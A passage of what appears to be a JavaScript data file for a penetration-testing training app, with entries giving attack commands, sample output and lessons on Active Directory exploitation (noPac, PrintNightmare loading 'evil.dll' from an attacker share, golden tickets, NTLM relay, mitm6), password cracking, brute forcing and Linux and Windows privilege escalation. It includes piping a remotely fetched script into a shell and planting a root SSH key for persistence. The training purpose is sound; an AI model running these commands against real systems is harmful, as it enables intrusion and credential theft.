      cmd: 'impacket-ticketer -nthash <krbtgt> -domain-sid S-1-5-21-... -domain acme.internal -extra-sid S-1-5-21-ROOT-519 administrator', tool: 'impacket-ticketer',
      output: [
        '[*] Creating golden ticket with extra SID (Enterprise Admins)',
        '[+] Saving ticket in administrator.ccache',
        '[*] Cross-domain access via SID History granted',
      ].join('\n'),
      signal: '[*] Cross-domain access via SID History granted',
      teach: 'SID History lets a principal carry privileged SIDs from another domain, legitimately used in migrations, abused to smuggle Enterprise Admin rights across a trust. It is how a single-domain compromise becomes forest-wide.',
    },
    'eternalblue': {
      why: "MS17-010 (EternalBlue) is unauthenticated SYSTEM-level RCE against an unpatched SMBv1 server, no credentials needed, which is why nmap's smb-vuln-ms17-010 flag is worth checking on any old Windows box. Reach for it when that check says VULNERABLE. It is reliable but can blue-screen the target, so treat it as a known-good exploit against confirmed-vulnerable hosts, not a blind spray, and remember it is a patch gap, not a misconfiguration.",
      cmd: 'nmap -p445 --script smb-vuln-ms17-010 -oN scans/ms17010.txt 10.10.10.10', tool: 'nmap',
      output: [
        'Host script results:',
        '| smb-vuln-ms17-010:',
        '|   VULNERABLE: Remote Code Execution in SMBv1 (ms17-010)',
        '|_    State: VULNERABLE',
      ].join('\n'),
      signal: '|_    State: VULNERABLE',
      teach: 'MS17-010 (EternalBlue) is unauthenticated SMBv1 remote code execution as SYSTEM. If the scan says VULNERABLE, it is often the whole box in one shot, but confirm the target is a real lab host, not a honeypot, before you fire the exploit.',
    },
    'nopac': {
      why: "One of the fastest post-foothold escalations there is, when it applies, so check the DC patch level early. Reach for it when you hold any domain credential and the DC is missing the CVE-2021-42278/42287 fixes. The flaw lets an ordinary user rename a machine account to impersonate a DC and then request a ticket as a privileged account, a straight line from a bare credential to Domain Admin that can save you the entire ACL-path grind.",
      cmd: "noPac.py acme.internal/jbloggs:'Autumn2026!' -dc-ip 10.10.10.10 -dump", tool: 'noPac.py',
      output: [
        '[*] Exploiting CVE-2021-42278 + CVE-2021-42287 (sAMAccountName spoofing)',
        '[+] Got a TGT impersonating a Domain Admin',
        '[*] Dumping NTDS...',
        'krbtgt:502:aad3b...:1a59bd44...:::',
      ].join('\n'),
      signal: '[+] Got a TGT impersonating a Domain Admin',
      teach: 'noPac abuses a sAMAccountName confusion to get a ticket as a DC/administrator from an ordinary user, a near-instant domain takeover on unpatched DCs. Beyond core OSCP scope but common in labs; confirm the DC is unpatched first.',
    },
    'printnightmare': {
      why: "Reliable whenever the Spooler service is running, which it is by default on a great many hosts, which is exactly why disabling Spooler became standard hardening after this dropped. Reach for it when you have a domain credential and find Spooler up, or when you need a local privesc. The abuse loads your DLL as SYSTEM, remotely against any host running the service or locally for elevation, so a running Spooler is a dependable route to SYSTEM.",
      cmd: "CVE-2021-1675.py acme.internal/jbloggs:'Autumn2026!'@10.10.10.10 '\\\\10.10.14.5\\share\\evil.dll'", tool: 'CVE-2021-1675.py',
      output: [
        '[*] Connecting to the Print Spooler service (MS-RPRN)',
        '[*] Triggering AddPrinterDriverEx to load the remote driver',
        '[+] Driver loaded; payload executed as SYSTEM',
      ].join('\n'),
      signal: '[+] Driver loaded; payload executed as SYSTEM',
      teach: 'PrintNightmare (CVE-2021-34527) abuses the Print Spooler to load a driver as SYSTEM, local privesc, or remote with creds. Check whether the Spooler service is even running first; if it is disabled, this path is closed.',
    },
    'ms14-068': {
      why: "Ancient and rare now, but trivial when you meet it, so it earns a quick check on any genuinely old DC. Reach for it only on legacy boxes, because the patch has been out for a decade. Where it still applies, a single command takes an ordinary domain user to Domain Admin by forging a Kerberos PAC that claims the membership, a golden-ticket-like result from low-priv creds, so it is worth ruling in or out before you reach for anything harder.",
      cmd: "impacket-goldenPac -dc-ip 10.10.10.10 acme.internal/jbloggs:'Autumn2026!'@dc01.acme.internal", tool: 'impacket-goldenPac',
      output: [
        '[*] Requesting a TGT with a forged PAC (admin SID)',
        '[+] Authenticated as Domain Admin',
        'C:\\Windows\\system32>',
      ].join('\n'),
      signal: '[+] Authenticated as Domain Admin',
      teach: 'MS14-068 forges the PAC inside a Kerberos ticket so an ordinary user claims Domain Admin membership. It only works on DCs missing the 2014 patch, rare today, but a clean, memorable example of how PAC validation can fail.',
    },
    'delegation-abuse': {
      why: "A family of escalation paths that all share one flaw: delegation trust set too loosely lets you borrow a more privileged identity. Reach for it when enumeration flags any delegation setting you can abuse, and the variant decides the play, unconstrained caches TGTs (coerce the DC to it and you own the domain), constrained and resource-based let a service request tickets as anyone. The common thread is that a service permitted to act for users becomes your permission to act as them.",
      cmd: 'impacket-addcomputer acme.internal/jbloggs:Autumn2026! -dc-ip 10.10.10.10 -computer-name OBOL$ -computer-pass MachinePass123!', tool: 'impacket-addcomputer',
      output: [
        '[*] Successfully added machine account OBOL$ with password MachinePass123!',
        '[*] MachineAccountQuota (default 10) allowed the creation',
      ].join('\n'),
      signal: '[*] Successfully added machine account OBOL$ with password MachinePass123!',
      teach: 'By default any domain user can add up to 10 computer accounts (MachineAccountQuota). A machine account you control is the starting piece for RBCD and S4U delegation attacks, create it, then configure delegation to impersonate an admin.',
    },
    'getst-impersonation': {
      why: "The final cash-in of a delegation finding, and the reason chasing one is worth the effort. When an account you hold can impersonate others, or you have just rigged RBCD with a write, getST performs the S4U dance and returns a Kerberos ticket that acts as whoever you choose, up to Administrator. It is scoped to the one service the delegation allows, but within that scope you simply are that identity.",
      cmd: "impacket-getST -spn cifs/file01.acme.internal -impersonate administrator 'acme.internal/OBOL$:MachinePass123!'", tool: 'impacket-getST',
      output: [
        '[*] Impersonating administrator',
        '[*] Requesting S4U2self',
        '[*] Requesting S4U2proxy',
        '[+] Saving ticket in administrator@cifs_file01.ccache',
      ].join('\n'),
      signal: '[+] Saving ticket in administrator@cifs_file01.ccache',
      teach: 'With delegation rights you ask the KDC for a service ticket "on behalf of" any user (S4U2self then S4U2proxy) and get a ccache that lets you act as Administrator against that service. Load the ticket (KRB5CCNAME) and you are in.',
    },

    // ============================ CREDENTIALS & CRACKING ============================
    'responder-poison': {
      why: "On a Windows network, when a host cannot resolve a name the normal way it shouts for it over LLMNR, NBT-NS, and mDNS, and Responder answers those shouts, so a user mistyping a share name hands you their NetNTLMv2 hash to crack. It runs entirely on your box and is semi-passive: you make no connection to any target, but you do send spoofed LLMNR, NBT-NS, and mDNS replies (that is the poisoning). Reach for it with a foothold on the segment and no creds yet; it is often the first domain credential you get.",
      signal: '[SMB] NTLMv2-SSP Username : ACME\\jdoe',
      teach: 'Responder runs entirely on YOUR box; there is nothing to install on a target. It is SEMI-PASSIVE: you start no connection to a target, but you do send spoofed name-resolution replies, and it only catches authentication that comes your way (a user mistyping a share name, so the host broadcasts "who is fileshare?" and Responder answers "me"). On a quiet network you could wait forever, so pair it with a coercion tool (coercer / PetitPotam / PrinterBug) to FORCE a chosen host to authenticate to you. Either way you walk away with a NetNTLMv2 hash to crack or relay.',
      steps: [
        { where: 'local', tool: 'responder', cmd: 'sudo responder -I eth0 -w', output: [
          '[+] Poisoners: LLMNR, NBT-NS, MDNS',
          '[+] Servers: SMB, HTTP, LDAP on',
          '[+] Listening for events...',
        ].join('\n') },
        { where: 'local', tool: 'coercer', cmd: "coercer coerce -t 10.10.10.50 -l 10.10.14.5 -u jdoe -p 'Autumn2026!' -d acme.internal", output: [
          '[+] DFSCoerce: 10.10.10.50 coerced to authenticate to 10.10.14.5',
          '↩ caught in your Responder window:',
          '[SMB] NTLMv2-SSP Username : ACME\\jdoe',
          '[SMB] NTLMv2-SSP Hash     : jdoe::ACME:1122334455667788:A1B2...:0101...',
        ].join('\n') },
      ],
    },
    'ntlm-relay-attack': {
      why: "When SMB signing is not required you do not have to crack captured authentication, you can relay it live to another host and act as that user: dump its SAM, run a command, add a computer. Pair it with coercion or Responder to generate the auth. Reach for it when the NTLM Relay finding says signing is off. It beats cracking because you never need the password at all, so it works even against strong ones.",
      signal: '[*] Authenticating against smb://10.10.10.20 as ACME/JDOE SUCCEED',
      teach: 'Relaying forwards a captured authentication to a SECOND host instead of cracking it, but ntlmrelayx, like Responder, only relays auth that comes IN to it. So you drive the traffic: coerce a target to authenticate (coercer / PetitPotam), and ntlmrelayx relays that to a machine where the victim is local admin (SMB signing off), dumping its SAM. "SUCCEED" means you are in without ever knowing the password.',
      steps: [
        { where: 'local', tool: 'impacket-ntlmrelayx', cmd: 'sudo impacket-ntlmrelayx -tf relay-targets.txt -smb2support', output: '[*] Servers started, waiting for connections' },
        { where: 'local', tool: 'coercer', cmd: "coercer coerce -t 10.10.10.50 -l 10.10.14.5 -u jdoe -p 'Autumn2026!' -d acme.internal", output: [
          '[+] 10.10.10.50 coerced to authenticate to 10.10.14.5',
          '↩ relayed by ntlmrelayx:',
          '[*] Authenticating against smb://10.10.10.20 as ACME/JDOE SUCCEED',
          '[*] Dumping local SAM hashes',
          'Administrator:500:aad3b...:31d6cfe0d16ae931b73c59d7e0c089c0:::',
        ].join('\n') },
      ],
    },
    'mitm6-ipv6-takeover': {
      why: "On a default dual-stack AD network this is one of the highest-impact moves you have, precisely because nobody configured the IPv6 nobody uses. mitm6 answers the DHCPv6 lease Windows keeps asking for, becomes the victim's DNS, and feeds the resulting authentication into a relay to a DC. Reach for it when plain Responder stays quiet, but respect the blast radius: it is powerful, noisy, and disruptive.",
      signal: '[*] Authenticating against ldaps://10.10.10.10 as ACME\\jdoe SUCCEED',
      teach: 'mitm6 runs on your box and abuses Windows\' preference for IPv6: it answers the DHCPv6 nobody configured, becomes the victim\'s DNS, and points WPAD at you, then ntlmrelayx relays the auth that follows to LDAP. It is not passive, but it does wait for a Windows host to renew (often a reboot or logon), so pair it with the relay and give it time.',
      steps: [
        { where: 'local', tool: 'mitm6', cmd: 'sudo mitm6 -i eth0 -d acme.internal', output: [
          '[*] Sending rogue DHCPv6 replies; spoofing DNS for *.acme.internal',
          '[*] IPv6 address assigned to victim 10.10.10.50',
        ].join('\n') },
        { where: 'local', tool: 'impacket-ntlmrelayx', cmd: 'sudo impacket-ntlmrelayx -6 -t ldaps://10.10.10.10 -wh fakewpad.acme.internal -l loot', output: [
          '[*] Victim queried WPAD, serving malicious proxy config',
          '[*] Authenticating against ldaps://10.10.10.10 as ACME\\jdoe SUCCEED',
          '[*] Domain info and delegation rights written to loot/',
        ].join('\n') },
      ],
    },
    'crack-identify': {
      why: "Spending two seconds to identify a hash format saves an hour of cracking it with the wrong mode. The leading marker ($krb5tgs$, $DCC2$, $6$) or the length and character set tells you the algorithm and the exact hashcat mode number. Do this before every crack. It is the cheapest insurance in the whole workflow, because a wrong mode number means hashcat either errors out or silently never matches.",
      cmd: 'nth -f hashes.txt', tool: 'name-that-hash',
      output: [
        '$krb5tgs$23$...',
        'Most Likely:',
        '  Kerberos 5 TGS-REP etype 23, HC: 13100  JtR: krb5tgs',
      ].join('\n'),
      signal: '  Kerberos 5 TGS-REP etype 23, HC: 13100  JtR: krb5tgs',
      teach: 'Before you can crack a hash you must know what it is. name-that-hash reads the format and tells you the hashcat mode (13100). Guess the mode wrong and hashcat wastes hours on the wrong algorithm, identify first, always.',
    },
    'crack-kerberoast': {
      why: "Service accounts are the soft target of Active Directory: their passwords are set by humans, rarely rotated, and any domain user can request a crackable ticket for them. A cracked $krb5tgs$ hash hands you that service account's plaintext, which often has elevated rights. Reach for it after roasting, run it offline, and if rockyou does not crack it the account probably has a strong password, so move on rather than grinding.",
      cmd: 'hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
      output: [
        '$krb5tgs$23$*svc_sql$ACME.INTERNAL$...:3f2a...:Summer2024!',
        'Status...........: Cracked',
      ].join('\n'),
      signal: 'Status...........: Cracked',
      teach: 'A Kerberoast ticket (mode 13100) is encrypted with the service account\'s password hash, so you crack it offline at full speed with no lockout. "Cracked" means you now hold that account\'s cleartext password.',
    },
    'crack-asrep-offline': {
      why: "This is the rare attack that asks nothing of you but a username list: one account with pre-authentication disabled hands you crackable ciphertext for free, no credentials required. The $krb5asrep$ hash it yields cracks offline to that user's plaintext, and a single pre-auth-disabled account can be your entire foothold into the domain. Reach for it the moment AS-REP roasting surfaces such a user; it is pure upside with nothing noisy on the wire.",
      cmd: 'hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
      output: [
        '$krb5asrep$23$jdoe@ACME.INTERNAL:a1b2...:Welcome2024!',
        'Status...........: Cracked',
      ].join('\n'),
      signal: 'Status...........: Cracked',
      teach: 'An AS-REP hash (mode 18200) comes from an account with pre-auth disabled, and it cracks offline at full speed. "Cracked" turns the roast into a login, a real domain credential.',
    },
    'crack-ntlm': {
      why: "Cracking is the step you take when passing the hash is not enough. A dump from the SAM or NTDS usually lets you pass NTLM directly, but plenty of services demand cleartext (RDP, a web login, SSH), and a recovered password is what proves reuse across the estate. So reach for it deliberately, when you need the plaintext specifically, not reflexively after every dump.",
      cmd: 'hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
      output: [
        '31d6cfe0d16ae931b73c59d7e0c089c0:(empty)',
        'f2a4e8c1b9d05e3a7c6f1b2e4d8a9c03:password1',
        'Status...........: Cracked',
      ].join('\n'),
      signal: 'f2a4e8c1b9d05e3a7c6f1b2e4d8a9c03:password1',
      teach: 'A dumped NTLM hash (mode 1000) cracks offline. You do not always need to (NTLM can be passed directly), but a recovered cleartext password is reusable on services that will not take a hash (RDP, web, SSH).',
    },
    'crack-netntlmv2': {
      why: "Unlike almost every hash you dump, this one cannot be passed: a NetNTLMv2 capture is crack-or-relay and nothing else. When you are not relaying it, the wordlist is your only route, and a crack turns a captured handshake into a real login wherever that account is valid. Reach for it right after a Responder or relay capture, and strip the duplicates Responder appends on every run before you start.",
      cmd: 'hashcat -m 5600 netntlmv2.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
      output: [
        'JDOE::ACME:1122334455667788:A1B2...:Winter2024!',
        'Status...........: Cracked',
      ].join('\n'),
      signal: 'JDOE::ACME:1122334455667788:A1B2...:Winter2024!',
      teach: 'The NetNTLMv2 hash Responder captured cracks offline in hashcat mode 5600. A NetNTLMv2 hash CANNOT be passed (only cracked or relayed), so recover the password and it becomes a real login wherever that account is valid.',
    },
    'crack-shadow': {
      why: "A /etc/shadow entry you managed to read, through a SUID binary, a backup, or a misconfiguration, cracks offline to a local password that is very often reused for sudo or on another box. Reach for it whenever you get shadow read access. The crack is the easy part; the real value is testing that recovered password everywhere, because people reuse passwords constantly.",
      cmd: 'hashcat -m 1800 shadow.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
      output: [
        'root:$6$xyz$...:toor123',
        'Status...........: Cracked',
      ].join('\n'),
      signal: 'root:$6$xyz$...:toor123',
      teach: 'A $6$ hash from /etc/shadow is sha512crypt (mode 1800), slow by design, so lean on a good wordlist and rules. Crack root\'s hash and the privesc is done; crack a service user and you may unlock lateral moves.',
    },
    'crack-archive': {
      why: "Someone bothered to lock this file, which is the whole reason to open it: encrypted backups and exports in loot almost always hide config files or credentials. The matching *2john (zip2john, rar2john) pulls a crackable hash, and once it falls you unpack the archive and read what was worth hiding. Treat any locked archive as a self-contained side quest that often hands you the next credential.",
      cmd: 'zip2john backup.zip > archive.hash && hashcat -m 17200 archive.hash rockyou.txt', tool: 'zip2john',
      output: [
        'backup.zip/config.bak:$pkzip2$...:hunter2',
        'Status...........: Cracked',
      ].join('\n'),
      signal: 'backup.zip/config.bak:$pkzip2$...:hunter2',
      teach: 'A password-protected archive you looted is just another crackable hash, zip2john/office2john extract it, hashcat breaks it. The contents are often the reason it was protected: credentials, keys, or the next foothold.',
    },
    'online-brute-ssh': {
      why: "Online brute-forcing is the loud, risky, last-resort option: reach for it only when SSH is reachable, you have an enumerated username list, and the quieter paths (loot, reuse, keys) are exhausted. It is noisy and can lock accounts, so it never runs on its own and the wordlist stays targeted. Prefer a short list of likely passwords against known-real users over a giant list against guesses.",
      cmd: 'hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -f -t 4 ssh://10.10.10.10', tool: 'hydra',
      output: [
        '[DATA] attacking ssh://10.10.10.10:22/',
        '[22][ssh] host: 10.10.10.10   login: bmurphy   password: iloveyou',
        '1 of 1 target successfully completed, 1 valid password found',
      ].join('\n'),
      signal: '[22][ssh] host: 10.10.10.10   login: bmurphy   password: iloveyou',
      teach: 'When you have a real username but no password, a measured online brute against SSH can find a weak one. Keep the wordlist small and the rate sane (-t 4), lab accounts lock out too, and a found pair is an instant shell.',
    },
    'online-brute-ftp': {
      why: "Once anonymous login and loot have both come up empty, FTP becomes a hydra target of last resort. The appeal is reuse: a recovered FTP password often unlocks SSH or the web too, so the payoff reaches past FTP itself. But this is loud, online brute-forcing that trips lockouts, so keep the user list tight and the password list sensible rather than blasting rockyou at it.",
      cmd: 'hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -f ftp://10.10.10.10', tool: 'hydra',
      output: [
        '[DATA] attacking ftp://10.10.10.10:21/',
        '[21][ftp] host: 10.10.10.10   login: bob   password: ftp123',
      ].join('\n'),
      signal: '[21][ftp] host: 10.10.10.10   login: bob   password: ftp123',
      teach: 'Against a confirmed FTP service with a known user, a measured hydra run finds weak passwords, and always test anonymous first, it is free. A hit gives you file access, and often the files hold the next credential.',
    },
    'online-brute-rdp': {
      why: "The prize is tempting (a valid RDP login is a full interactive desktop) but the lockout risk makes this a careful, late-stage move. Spray one or two likely passwords across many users rather than many passwords at a single account, and reach for it only once the quieter options are exhausted. Go slow: RDP lockout policies bite hard, and a tripped account is exactly what wakes a defender.",
      cmd: 'hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -f -t 1 rdp://10.10.10.10', tool: 'hydra',
      output: [
        '[DATA] attacking rdp://10.10.10.10:3389/',
        '[3389][rdp] host: 10.10.10.10   login: admin   password: Password1',
      ].join('\n'),
      signal: '[3389][rdp] host: 10.10.10.10   login: admin   password: Password1',
      teach: 'A weak RDP password is an interactive desktop. Brute it only with a real username and a short list at -t 1, RDP lockout policies are unforgiving. A hit here is a full GUI session as that user.',
    },
    'crack-mscache2': {
      why: "When you dump a workstation's secrets and find cached logons, this is how you turn them into a usable password. The $DCC2$ blobs exist so a laptop can authenticate a domain user with the DC unreachable; they are deliberately slow and, unlike NT hashes, cannot be passed, so cracking is the only path. A weak one still falls, and the plaintext is a genuine domain credential worth the long wait.",
      cmd: 'hashcat -m 2100 dcc2.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
      output: [
        '$DCC2$10240#jdoe#a1b2c3...:Autumn2023!',
        'Status...........: Cracked',
      ].join('\n'),
      signal: '$DCC2$10240#jdoe#a1b2c3...:Autumn2023!',
      teach: 'Domain Cached Credentials (mscash2, mode 2100) are what a laptop stores so a domain user can log in offline. They crack slowly and cannot be passed (only cracked), but a recovered password is a real domain credential.',
    },

    // ============================ LINUX PRIVESC ============================
    'linux-enum': {
      why: "You escalate by finding the one thing that is wrong, not by recalling techniques, so this is where every Linux privesc starts. Run a scanner like linpeas for coverage, but read its output hunting for the single outlier: an odd SUID bit, a writable path in root's PATH, a password in a config. Do it the moment you land. The scanner finds a hundred things; your job is to spot the one that matters, so read with a question, not a checklist.",
      signal: '    (ALL) NOPASSWD: /usr/bin/find',
      teach: 'linpeas runs every local privesc check at once and colour-codes the leads, but it is not on the target, so you serve it from your box and pipe it straight into a shell (no file touches disk). A NOPASSWD sudo entry on a GTFOBins binary like find is a bright-green, near-certain path to root. Enumerate first; it points you at the real vector.',
      steps: [
        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding linpeas.sh', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
        { where: 'host', tool: 'linpeas', cmd: 'curl -sL http://10.10.14.5:8000/linpeas.sh | sh', output: [
          '[+] Sudo version 1.8.31',
          '[+] Checking sudo -l',
          '    (ALL) NOPASSWD: /usr/bin/find',
          '[+] SUID - Check easy privesc',
          '    /usr/bin/pkexec',
        ].join('\n') },
      ],
    },
    'sudo-abuse': {
      why: "`sudo -l` is the first command to run on any Linux foothold, because the answer is so often an instant win: a NOPASSWD entry on a binary GTFOBins knows how to escape (vim, find, awk, python) is root in one line. Reach for it immediately after enumeration. The pattern to learn is \"what can this binary be made to do beyond its intended job\", because that same idea reappears with SUID and capabilities.",
      cmd: 'sudo -l', tool: 'sh',
      output: [
        'Matching Defaults entries for www-data on target:',
        '    env_reset, mail_badpass',
        'User www-data may run the following commands on target:',
        '    (ALL) NOPASSWD: /usr/bin/find',
      ].join('\n'),
      signal: '    (ALL) NOPASSWD: /usr/bin/find',
      teach: 'sudo -l lists what you may run as another user without a password. NOPASSWD on a GTFOBins binary like find is a direct road to root (find . -exec /bin/sh \\; ). It is the first command to run on any Linux foothold.',
    },
    'writable-passwd': {
      why: "A world-writable /etc/passwd is a direct, exploit-free path to root: append a line for an account whose password hash you generated on your own box, then su to it. It turns up in labs more than it should. Reach for it whenever enumeration flags /etc/passwd as writable. There is no payload and nothing to crack, which makes it one of the cleanest escalations there is, just back up the file first.",
      cmd: 'ls -la /etc/passwd', tool: 'sh',
      output: [
        '-rw-rw-rw- 1 root root 2841 Jan  1 10:00 /etc/passwd',
      ].join('\n'),
      signal: '-rw-rw-rw- 1 root root 2841 Jan  1 10:00 /etc/passwd',
      teach: 'A world-writable /etc/passwd lets you add a root-UID user with a password hash you control (openssl passwd), then su to it. A single misconfigured permission bit is a direct path to root.',
    },
    'nfs-squash': {
      why: "This is the privesc that straddles two machines, and that split is exactly where people fumble it: you build the weapon on your box and fire it on the target. When an export carries no_root_squash the server honours your local root, so a root-owned SUID shell you drop over the mount runs as root the moment you execute it on the target. Reach for it as soon as an NFS scan or enumeration shows that export flag, and keep clear which half runs where.",
      cmd: 'showmount -e 10.10.10.10', tool: 'showmount',
      output: [
        'Export list for 10.10.10.10:',
        '/srv/share  *(rw,no_root_squash)',
      ].join('\n'),
      signal: '/srv/share  *(rw,no_root_squash)',
      teach: 'no_root_squash on an NFS export means files you create as root on your own machine stay root-owned on the target. Mount it, drop a root-owned SUID shell, and run it on the box, a classic NFS privesc. Check the export options first.',
    },
    'lxc-lxd-escape': {
      why: "Most privilege escalation turns on what you can do; this one turns on who you already are. A single line of `id` can hand you the entire machine with no exploit fired and no password guessed. That is the habit worth building: the instant you land a foothold, read your group memberships before anything else, because one dangerous group makes the rest a formality you simply follow a recipe through. On lab boxes this is one of the most common ways in for exactly that reason.",
      cmd: 'id', tool: 'sh',
      output: [
        'uid=1000(dev) gid=1000(dev) groups=1000(dev),110(lxd)',
      ].join('\n'),
      signal: 'uid=1000(dev) gid=1000(dev) groups=1000(dev),110(lxd)',
      teach: 'Membership in the lxd group is root-equivalent: you launch a privileged container that mounts the host filesystem and read or write anything as root. Like the docker group, lxd is a privilege nobody thinks of as one, always check your groups.',
    },
    'docker-socket': {
      why: "The pattern here outlives this one trick: anything that lets you speak to a daemon running as root is, in effect, root yourself. A socket you can write to, or a group that grants it, is worth as much as the password you never had to find. So after a foothold do not stop at files and sudo rights; ask what each group you hold and each writable socket can actually command, because that question is what quietly turns an ordinary shell into ownership of the whole host.",
      cmd: 'ls -la /var/run/docker.sock && id', tool: 'sh',
      output: [
        'srw-rw---- 1 root docker 0 Jan 1 10:00 /var/run/docker.sock',
        'uid=1000(dev) gid=1000(dev) groups=1000(dev),998(docker)',
      ].join('\n'),
      signal: 'uid=1000(dev) gid=1000(dev) groups=1000(dev),998(docker)',
      teach: 'Membership in the docker group is root-equivalent: you can start a container that mounts the host\'s / and read or write anything as root. The docker socket being reachable is the whole game.',
    },
    'suid-gtfobins': {
      why: "A SUID binary runs as its owner, usually root, so the question on every Linux box is whether there is a SUID binary that should not be one. The stock ones (su, mount, passwd) are expected noise; what you want is the outlier, a custom or out-of-place binary that GTFOBins has a shell-escape for. Reach for it during enumeration, and train your eye to find the odd one out, because that single misplaced SUID bit is a classic root.",
      cmd: 'find / -perm -4000 -type f 2>/dev/null', tool: 'sh',
      output: [
        '/usr/bin/passwd',
        '/usr/bin/sudo',
        '/usr/bin/find',
      ].join('\n'),
      signal: '/usr/bin/find',
      teach: 'A SUID binary runs as its owner (often root) no matter who starts it. Cross the list against GTFOBins, /usr/bin/find with the SUID bit is a one-liner to a root shell. Ignore the expected ones (passwd, sudo); hunt the unusual.',
    },
    'pspy-monitor': {
      why: "Root runs scheduled jobs that never appear in your crontab, and pspy watches process creation to reveal them without needing root. The gold is a script in a writable path that root runs on a timer, or a command leaking a credential on its arguments. Reach for it when enumeration hints that \"something runs periodically\" but you cannot see what. It is patience as a technique: let it watch, and the scheduled root job shows itself.",
      signal: '2026/09/17 10:41:01 CMD: UID=0  PID=4120  /bin/bash /opt/backup.sh',
      teach: 'pspy watches the process table without root, so it catches cron jobs and scheduled tasks you cannot see in crontab, but it is a binary you have to get onto the box first. Serve it from your box, pull it down and make it executable, then run it. A root job (UID=0) running every 2 minutes is a privesc lead: if you can write the script it runs, you run code as root.',
      steps: [
        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding pspy64', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
        { where: 'host', tool: 'pspy', cmd: 'wget http://10.10.14.5:8000/pspy64 -O /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy -pf -i 1000', output: [
          "Saved '/tmp/pspy' [3078592/3078592]",
          '2026/09/17 10:41:01 CMD: UID=0  PID=4120  /bin/bash /opt/backup.sh',
          '2026/09/17 10:43:01 CMD: UID=0  PID=4221  /bin/bash /opt/backup.sh',
        ].join('\n') },
      ],
    },
    'cron-abuse': {
      why: "Two classic root-via-cron bugs: a root cron job that runs a script you can write (edit it, wait, become root), and a root job running tar or rsync with a wildcard in a directory you control (you plant filenames that become command-line options). Reach for it when pspy or enumeration shows a root job touching anything you can write. The wildcard-injection trick especially is worth learning, because it looks harmless and is anything but.",
      cmd: 'cat /etc/crontab', tool: 'sh',
      output: [
        'SHELL=/bin/sh',
        '*/2 *   * * *   root    /opt/backup.sh',
        '# and /opt/backup.sh is world-writable',
      ].join('\n'),
      signal: '*/2 *   * * *   root    /opt/backup.sh',
      teach: 'A cron job that runs as root on a script you can write is a direct privesc: append a reverse shell or a SUID copy of bash, wait for the next run, and you are root. Check /etc/crontab, /etc/cron.*, and tar-wildcard jobs.',
    },
    'capabilities': {
      why: "Linux capabilities slice root's power into pieces, and a misplaced one is a shortcut to root: cap_setuid on python is an instant root shell, cap_dac_read_search reads any file including shadow, cap_sys_admin is nearly root outright. Reach for it during enumeration with getcap. It is the same \"what can this binary really do\" reasoning as SUID and sudo, just expressed through capabilities, so check it in the same pass.",
      cmd: 'getcap -r / 2>/dev/null', tool: 'sh',
      output: [
        '/usr/bin/python3.8 = cap_setuid+ep',
        '/usr/bin/ping = cap_net_raw+ep',
      ].join('\n'),
      signal: '/usr/bin/python3.8 = cap_setuid+ep',
      teach: 'File capabilities grant slices of root power without the SUID bit. cap_setuid+ep on python means it can set its UID to 0, one line (os.setuid(0)) and you are root. Always run getcap -r / on a Linux box.',
    },
    'linux-loot-hunt': {
      why: "Before the clever techniques, just go looking, because credentials sitting in plain sight escalate more boxes than any exploit: shell history, config files with passwords, other users' readable home directories, backups under /opt and /var, mail spools. Reach for it right after your enumeration sweep. The mindset is \"where would a lazy admin leave a password\", and the answer is usually a file you can already read.",
      cmd: 'grep -rils "password" /var/www /home 2>/dev/null', tool: 'sh',
      output: [
        '/var/www/html/config.php: $db_pass = "w3b4ppp4ss";',
        '/home/dev/.bash_history: mysql -u root -pSuperSecret123',
      ].join('\n'),
      signal: '/var/www/html/config.php: $db_pass = "w3b4ppp4ss";',
      teach: 'Once you have a shell, loot before you escalate. Config files, shell history, and web roots leak passwords constantly, and people reuse them, so a web app\'s DB password is often root\'s too. Grep widely for password, secret, and key.',
    },
    'linux-persistence': {
      why: "Persistence is the move you make after the box is already won, to keep it won: a way back that outlasts the password reset and the reboot. It earns its place in long engagements and wherever an exam permits re-entry, and on a short lab it is simply optional. The quiet options are your SSH key in root's authorized_keys, a sudoers line for an account you own, or a cron callback, and every single one belongs in your notes so you can clean it up.",
      signal: 'root@target:~#',
      teach: 'Labs revert and shells die. Adding your public key to authorized_keys gives you a stable, password-free way back in, far better than re-exploiting each time. On a real engagement, persistence is scoped and documented.',
      steps: [
        { where: 'host', tool: 'sh', cmd: "mkdir -p /root/.ssh && echo 'ssh-ed25519 AAAA...you@kali' >> /root/.ssh/authorized_keys", output: [
          '# your public key is now appended to root\'s authorized_keys (no output on success)',
        ].join('\n') },
        { where: 'local', tool: 'ssh', cmd: 'ssh -i id_ed25519 root@10.10.10.10', output: [
          'Last login: Mon Jan  1 10:00:00 2024 from 10.10.14.5',
          'root@target:~#',
        ].join('\n') },
      ],
    },

    // ============================ WINDOWS PRIVESC ============================
    'windows-enum': {
      why: "Windows privesc rewards reading over running: winpeas floods you with output, and the whole skill is spotting the one line that matters in the noise. On lab boxes that outlier is usually a misconfigured service, a credential left in a file or the registry, or an abusable token privilege. Run it the moment you land a shell, then hunt the report for the outlier rather than reading it top to bottom.",
      signal: 'SeImpersonatePrivilege: Enabled',
      teach: 'Start with the built-in whoami /priv (instant, nothing to stage), then run the deep sweep with winPEAS, which is an .exe you must get onto the box first. Serve it from your box and pull it over with certutil, then run it. SeImpersonate Enabled on a service account means a "potato" exploit gets you SYSTEM.',
      steps: [
        { where: 'host', tool: 'cmd', cmd: 'whoami /priv', output: [
          'Privilege Name                State',
          'SeImpersonatePrivilege        Enabled',
          'SeChangeNotifyPrivilege       Enabled',
        ].join('\n') },
        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding winPEASx64.exe', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
